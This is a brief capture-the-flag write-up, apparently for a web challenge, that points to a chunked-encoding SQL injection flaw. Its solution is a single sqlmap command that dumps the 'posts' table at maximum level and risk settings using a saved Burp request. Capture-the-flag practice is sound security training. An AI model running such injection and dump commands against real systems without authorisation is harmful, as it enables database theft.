you have to read the code, and notice the chunked vulnerability

Steps : 
* export the request from burp (copy to file)
* run sql query `python sqlmap.py -r /tmp/req.txt --level 5 --risk 3  --ignore-code=500 --dump -T posts --threads 10 --chunked`

you'll get the flag